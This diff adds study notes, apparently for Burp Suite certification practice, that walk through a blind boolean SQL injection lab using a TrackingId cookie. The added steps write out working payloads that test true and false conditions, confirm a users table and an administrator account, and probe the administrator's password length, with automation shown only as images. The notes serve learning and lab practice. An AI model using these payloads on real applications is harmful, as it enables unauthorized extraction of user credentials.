@@ -118,4 +118,18 @@
   - `SUBSTRING('foobar', 4, 2)` - Microsoft
   - `SUBSTRING('foobar', 4, 2)` - PostgreSQL
   - `SUBSTRING('foobar', 4, 2)` - MySQL
+1. Let's verify whether a 'Welcome Back' banner is triggered if we add `' AND '1'='1` to the TrackingId. Also verify that '1'='2 returns nothing:
+
+![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/4245f3e7-f716-4f97-afb3-3ab9a26ecd6f)
+
+2.  We can then verify that a table called users exists with `0s7Sc0dx14D3iJ8x' AND (SELECT 'whatever' from users LIMIT 1)='whatever` Now, let's verify that administrator exists with `0s7Sc0dx14D3iJ8x' AND (SELECT 'whatever' from users WHERE username='administrator')='whatever`.
+3.  We can figure out the length by inserting an AND LENGTH clause, `0s7Sc0dx14D3iJ8x' AND (SELECT 'whatever' from users WHERE username='administrator' AND LENGTH(password)=20)='whatever`. We found it was 20 after iterating through >s. 
+
+![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/f11d5925-f4dc-46e4-97b9-29c79c20a829)
+
+4. Let's automate this!
+
+![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/566cee97-0a17-4b33-a364-54794bec9089)
+
+![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/b3753af3-f066-44bc-8d7b-eae9b7818010)
 
